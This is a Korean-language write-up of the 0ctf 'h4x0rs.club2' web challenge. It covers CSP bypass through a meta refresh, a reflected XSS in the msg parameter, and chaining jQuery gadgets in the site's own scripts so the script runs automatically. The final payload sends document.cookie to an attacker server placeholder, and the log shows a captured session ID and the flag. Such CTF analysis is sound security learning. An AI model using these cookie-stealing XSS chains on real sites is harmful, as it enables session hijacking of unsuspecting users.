# [Web] 0ctf - h4x0rs.club2

## Description

Get document .cookie of the administartor.

h4x0rs.club

backend_www got backup at /var/www/html.tar.gz

Hint: Get open-redirect first, lead admin to the w0rld!



## Analysis & Exploit

로그인 후 Profile을 작성할 수 있는데, Response Header를 보면 다음과 같다.

```
Content-Security-Policy: default-src 'none'; img-src * data: ; script-src 'nonce-e3481660056cc8a9d7e9adbd42c0d470'; style-src 'self' 'unsafe-inline' fonts.googleapis.com; font-src 'self' fonts.gstatic.com; frame-src https://www.google.com/recaptcha/;
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block;
```

CSP가 걸려있으며, script의 경우 nonce가 적용되어 있으나 cache를 사용하지 않아(`Pragma: no-cache`) 사용이 불가능하다.

CSP를 우회하여 Redirect할 수 있는데, 스크립트는 다음과 같다.

```html
<meta http-equiv="refresh" content="0;url=[MY SERVER]">
```

이를 이용해 내 사이트로 Redirect가 가능하다.

그래서 ajax를 이용해 긁어오게 하려고 하였으나 Access-Control-Allow-Origin에 의해 실패하였으며, 코드는 아래와 같다.

```html
<script src="jquery.js"></script>
<script>
	$.ajax({
		url: "https://h4x0rs.club/",
		type: "POST",
		xhrFields: {
			withCredentials: true,
		},
		beforeSend: function(xhr) {
		},
		success: function(data,status, xhr){
			location.href="//[MY SERVER]/?"+xhr.getResponseHeader("Cookie");
		},
	});
</script>
```

다른 방법을 찾던 중 Reflected XSS를 발견하였다.

vector는 msg로써 형식은 다음과 같다.

```
https://h4x0rs.club/?msg=THIS
```

모든 페이지에서 msg를 사용하면 페이지의 소스안에 들어가는 것을 확인하였다.

이를 이용하여 스크립트를 삽입하면 되지만, Reflected xss의 경우 브라우저의 XSS 필터링을 거치기 때문에 이를 우회하거나 다른 방식으로 XSS를 일으켜야 한다.

해당 페이지는 jquery로 구축되어 있으며 구현된 소스를 기반으로 Reflected XSS를 만들 수 있었다.

```javascript
# app.js
function b() {
        x(), $(".js-user").append($("#audiences").html()), $(".challenge-out-of-time").show()
        CLIENT_GAME.answer( function (correct) {
            console.log("answer",correct);
            correct ?
            ($(".out-of-time-response").hide(), $("#response-happy").show(), $.get('/game/login.php?action=upgrade&level='+(LEVEL+1)) , setTimeout(()=>{alert('Congratz!');location.reload()},2000))
            : ($(".out-of-time-response").hide(), $("#response-sad").show(), setTimeout(()=>{alert('Sad :(');location.reload()},2000));
        }, $('#answer').val().trim().replace(/\b\w/g, l => l.toUpperCase()) );
    }
function T() {
        function e(e) {
            var t = Date.parse(e) - Date.parse(new Date),
                n = Math.floor(t / 1e3 % 60);
            return {
                total: t,
                minutes: Math.floor(t / 1e3 / 60 % 60),
                seconds: n
            }
        }
        y(), q === P.PAUSED && p(), q = P.ACTIVE, g();
        var t = $("#timer .minutes").text(),
            n = $("#timer .seconds").text(),
            i = new Date(Date.parse(new Date) + 1 * t * 60 * 1e3 + 1 * n * 1e3);
        t >= 60 && i.setSeconds(i.getSeconds() - 1),
            function(t, n) {
                function i() {
                    var t = e(n);

                    s.innerHTML = ("0" + t.minutes).slice(-2), a.innerHTML = ("0" + t.seconds).slice(-2), t.total <= 0 && (window.clearInterval(u), b())
                }
                r(), $(".workoutman--animated").show(), $(".workoutman--still").hide();
                var o = document.getElementById(t),
                    s = o.querySelector(".minutes"),
                    a = o.querySelector(".seconds");
                i();
                var u = setInterval(i, 1e3);

                O.push(u)
            }("timer", i)
    }
function o() {
        q === P.PAUSED ? T() : l(function() {
            T()
        }), h(), p()
    }
$(document).ready(function() {
        $("#easy").addClass("selected"), $('a[href="#"]').click(function(e) {
            e.preventDefault()
        }), $(".js-difficulty").click(function() {
            $(".js-difficulty").removeClass("selected"), $(this).addClass("selected"), L = $(this).data("difficulty"), u(L)
        }), $(".js-pause-button").click(function() {
            c(), q === P.PAUSED ? o() : (q = P.PAUSED, c())
        }), $(".js-stop-button").click(function() {
            f(), q = P.STOPPED
        }), $(".js-info-button").click(function() {
            w(), $(".js-info-button").hasClass("selected") && y()
        }), $(".selectable").click(function() {
            $(this).toggleClass("selected")
        }), $(".timer__button").click(function() {
            var e = void 0;
            e = "decrease" == $(this).data("stepper-direction") ? -5 : 5;
            var t = $(".timer .minutes"),
                n = parseInt(t.text(), 10),
                r = n + e;
            r <= 5 || r >= 60 ? $(this).attr("disabled", !0).addClass("button--disabled") : $(".timer__button").attr("disabled", !1).removeClass("button--disabled");
            var i = void 0;
            i = r >= 5 && r <= 60 ? r.toString() : n.toString(), i < 10 && (i = "0" + i), t.text(i)
        }), $(".js-start-button").click(function() {
            o()
        }), $("#reload-button").click(function() {
            u(localStorage.getItem("difficulty"))
        })
    })
```

페이지 로드 시 불러오는 javascript 중 app.js내의 b 함수를 class가 js-user인 값에 id가 audiences인 값의 내용을 넣는다.

트리거를 위해선 js-start-button을 클릭하면 o() -> T() -> b()가 순서대로 실행되어 스크립트를 실행할 수 있으며 쿼리는 다음과 같다.

```html
<script class="js-user"></script><div id="audiences">alert(1);</div>
```

이를 삽입하여 js-start-button을 누르면 게임 시작 후 10초 뒤에 alert(1);이 실행된다.

하지만 이는 버튼을 눌러야만 발동을 하므로 자동으로 실행되게끔 해야한다.

페이지 로드시 불러오는 client.js를 이용해 트리거시킬 수 있었다.

```javascript
# client.js
$( document ).ready(function() {
    CLIENT_GAME.init();
    $('#play-stop-btn').hide();
    var p = setInterval(function(){
        if(CLIENT_GAME.ready == true) (clearInterval(p), $('#play-stop-btn').show());
    },500)
;    setTimeout(function(){$('.js-difficulty').children().click();},1000);
});
```

client.js가 로드되면 js-difficulty의 하위를 클릭하는데 이를 이용해 리플렉이 자동으로 실행되도록 만들었다.

페이로드는 다음과 같다.

```html
<div class="button button--small button--blue js-difficulty d-flex justify-content-center align-items-center button js-start-button grow button--green d-flex justify-content-center align-items-center"><i class="icon ion-play"></i></div><script class="js-user"></script><div id="audiences">alert(1);</div>
```

이를 이용하면 페이지 로드 시 자동으로 게임이 실행되지만, 10초 후에 스크립트가 실행되기 때문에 봇이 따라가지 못하는 것 같다.

```javascript
# app.js
function T() {
        function e(e) {
            var t = Date.parse(e) - Date.parse(new Date),
                n = Math.floor(t / 1e3 % 60);
            return {
                total: t,
                minutes: Math.floor(t / 1e3 / 60 % 60),
                seconds: n
            }
        }
        y(), q === P.PAUSED && p(), q = P.ACTIVE, g();
        var t = $("#timer .minutes").text(),
            n = $("#timer .seconds").text(),
            i = new Date(Date.parse(new Date) + 1 * t * 60 * 1e3 + 1 * n * 1e3);
        t >= 60 && i.setSeconds(i.getSeconds() - 1),
            function(t, n) {
                function i() {
                    var t = e(n);

                    s.innerHTML = ("0" + t.minutes).slice(-2), a.innerHTML = ("0" + t.seconds).slice(-2), t.total <= 0 && (window.clearInterval(u), b())
                }
                r(), $(".workoutman--animated").show(), $(".workoutman--still").hide();
                var o = document.getElementById(t),
                    s = o.querySelector(".minutes"),
                    a = o.querySelector(".seconds");
                i();
                var u = setInterval(i, 1e3);

                O.push(u)
            }("timer", i)
    }
```

그래서 10초가 아닌 즉시 스크립트가 실행되도록 변경하는 스크립트를 추가하였으며, 최종적으로 만들어진 쿼리는 다음과 같다.

```javascript
<div class="timer d-flex p mb-3 flex-md-row grow align-items-stretch" id="timer"><div class="timer__display screen d-flex justify-content-center"><div class="align-self-center font-weight-fat"><span class="minutes">00</span> <span class="colon"></span> <span class="seconds">10e-3</span></div></div></div><div class="button button--small button--blue js-difficulty d-flex justify-content-center align-items-center button js-start-button grow button--green d-flex justify-content-center align-items-center"><i class="icon ion-play"></i></div><script class="js-user"></script><div id="audiences">location.href="http://[MY SERVER]/"+document.cookie;</div>
```

이를 이용하여 admin의 쿠키를 탈취할 수 있었고, 플래그를 얻을 수 있었다.

```
203.205.141.123 - - [04/Apr/2018 05:27:13] code 404, message File not found
203.205.141.123 - - [04/Apr/2018 05:27:13] "GET /PHPSESSID=0v33rcqo1qfrei9qpc080nm851;%20flag=flag%7Bpostman_1n_the_middl3%7D HTTP/1.1" 404 -
```



**flag{postman_1n_the_middl3}**

